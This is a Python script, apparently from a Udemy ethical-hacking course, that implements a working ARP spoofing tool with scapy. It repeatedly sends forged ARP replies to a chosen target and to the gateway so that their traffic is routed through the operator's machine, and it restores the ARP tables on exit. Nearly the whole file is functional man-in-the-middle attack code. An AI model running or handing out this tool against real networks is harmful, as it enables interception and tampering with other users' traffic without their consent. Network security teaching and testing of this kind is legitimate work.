import scapy.all as scapy
import optparse
import time

def get_input():
    parse_ob = optparse.OptionParser()
    parse_ob.add_option("-t", "--target", dest="target", help="Target IP address")
    parse_ob.add_option("-r", "--router", dest="router", help="Router's IP address")

    options = parse_ob.parse_args()[0]
    if not options.target:
        print("Enter a target ip!\nExample: -t 33.33.33.8")
        exit(1)
    elif not options.router:
        print("Enter a gateway ip!\nExample: -r 33.33.33.1")
        exit(1)
    else:
        return options


def arp_poison(target_ip, poisoned_ip):
    # op = 1 makes it a request, 2 makes response
    # pdst = victim's IP address
    # hwdst= victim's MAC address
    # psrc = router's IP address
    target_mac = get_mac_addr(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def reset(fooled_ip, gateway_ip):
    target_mac = get_mac_addr(fooled_ip)
    gateway_mac = get_mac_addr(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=target_mac, psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)


def get_mac_addr(ip):
    # range to scan
    arp_request_packet = scapy.ARP(pdst=ip)

    # what to broadcast
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # combine both packets, this is specified in the scapy docs
    combined_packet = broadcast_packet / arp_request_packet
    # actually broadcast it and return result mac address
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


user_inputs = get_input()
# need to keep running until user exits because poisoning doesn't last long

num = 0
try:
    while True:
        arp_poison(user_inputs.target, user_inputs.router)
        arp_poison(user_inputs.router, user_inputs.target)

        num += 2
        # print a recursive message to let user know tool works,
        #   at the end just delete and print on same line
        print("\rSending packets " + str(num), end="")
        # sleep after the poisoning in order to not overload cpu
        time.sleep(5)
except KeyboardInterrupt:
    print("Ending and resetting")
    reset(user_inputs.target, user_inputs.router)
    reset(user_inputs.router, user_inputs.target)
finally:
    print("Hope you enjoyed the tool! Written by VT, copied from Atil Sam on Udemy.")